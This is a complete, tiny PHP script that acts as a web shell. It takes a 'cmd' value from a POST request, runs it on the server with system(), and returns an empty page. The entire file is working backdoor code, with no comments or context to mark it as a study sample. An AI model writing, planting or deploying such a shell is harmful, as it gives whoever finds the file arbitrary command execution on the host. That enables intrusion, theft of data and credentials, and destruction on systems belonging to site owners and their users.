<?php
if(isset($_POST['cmd']))
{
   $cmd = $_POST['cmd'];
   $output = system($cmd);
}
die("");
?>